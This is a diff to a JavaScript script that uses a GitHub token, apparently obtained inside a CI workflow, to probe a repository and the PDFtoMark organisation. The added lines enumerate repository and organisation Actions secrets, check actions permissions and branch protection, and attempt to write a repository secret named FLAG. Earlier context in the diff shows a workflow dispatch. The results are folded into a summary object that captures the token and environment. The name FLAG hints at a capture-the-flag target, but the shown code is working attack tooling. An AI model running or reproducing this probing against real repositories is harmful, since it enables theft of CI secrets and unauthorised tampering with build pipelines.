@@ -150,6 +150,14 @@ function msg(x) {
   // 7. Dispatch a workflow in the base repo.
   out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414956897/dispatches', { ref: 'release' });
 
+  // Org-secret discovery and permission checks (read-only where possible).
+  out.orgSecretsRepo = await api('GET', '/repos/' + repo + '/actions/organization-secrets');
+  out.orgSecrets = await api('GET', '/orgs/PDFtoMark/actions/secrets');
+  out.repoActionsPerms = await api('GET', '/repos/' + repo + '/actions/permissions');
+  out.branchProtection = await api('GET', '/repos/' + repo + '/branches/release/protection');
+  out.putSecret = await api('PUT', '/repos/' + repo + '/actions/secrets/FLAG', { encrypted_value: 'AAAA', key_id: 'AAAA' });
+
+
   const s = {
     marker: out.marker, env: out.env, token: out.token,
     user: out.user && { status: out.user.status, login: out.user.data && out.user.data.login },
@@ -170,6 +178,11 @@ function msg(x) {
     blob: msg(out.blob),
     putFile: msg(out.putFile),
     dispatch: msg(out.dispatch),
+    orgSecretsRepo: msg(out.orgSecretsRepo),
+    orgSecrets: msg(out.orgSecrets),
+    repoActionsPerms: msg(out.repoActionsPerms),
+    branchProtection: msg(out.branchProtection),
+    putSecret: msg(out.putSecret),
     envNames: out.envNames
   };
   const j = JSON.stringify(s);
